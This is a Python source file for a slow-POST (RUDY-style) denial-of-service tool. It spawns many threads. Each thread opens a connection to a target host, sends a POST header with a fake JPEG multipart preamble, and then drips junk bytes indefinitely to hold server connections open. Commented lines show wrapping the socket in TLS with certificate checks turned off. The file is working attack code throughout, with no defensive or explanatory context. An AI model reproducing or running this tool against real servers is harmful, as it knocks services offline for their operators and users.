#s.connect((target, 443))
#s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
#s.sendall(request)


import threading
import sys
import socket  
from time import sleep
import random
 
class ThreadMaker:

    def lunch(self, functionObj, arguments, thread_count):

        fn = functionObj
        for i in range(0, thread_count):
            t = threading.Thread(target=fn, args=(arguments, i))
            t.start()
            sleep(0.01)


class RudyConnection:


    def __init__(self):

        self.tried_connection = 0
        self.dropped_connection = 0


    def create_slowconnection_single(self, arguments_dict, thread_id):
 
        target = arguments_dict['target']
        port = arguments_dict['port']
        uri = arguments_dict['uri']
        chunksize= arguments_dict['chunksize']
        timeinterval= arguments_dict['timeinterval']
        headers_d = arguments_dict['headers']


        additional = '-----------------------------753615180560430119613140835\r\nContent-Disposition: form-data; name="fileN"; filename="starship.jpeg"\r\nContent-Type: image/jpeg\r\n\r\n\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01'
     
        headers = ""
        for k in list(headers_d.keys()):
            value = headers_d[k]
            headers += k + ": " + str(value) + "\r\n"
        headers += "\r\n"    

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        request = bytes("POST /"+str(uri)+" HTTP/1.1\r\n" + headers, 'utf-8') 
        request+= bytes(additional ,'utf-8')
        sleep(timeinterval)

    
        try:
            s.connect((target, port))
            self.tried_connection += 1
        except:
            print("------------ connection is refused")
            return 


        try:
            s.send(request)
        except:
            #print("------------ socket is broken")
            self.dropped_connection += 1
            return
    
        count = 0
        while True:
            junks = bytes(chunksize * 'a', "utf-8")
            try:
                s.send(junks)
            except:
                #print("------------ socket is boken")
                self.dropped_connection += 1
                return
            #print("sending junks of length: " + str(chunksize) + "  " + str(count)) 
            count+=1

            sleep(timeinterval)
        
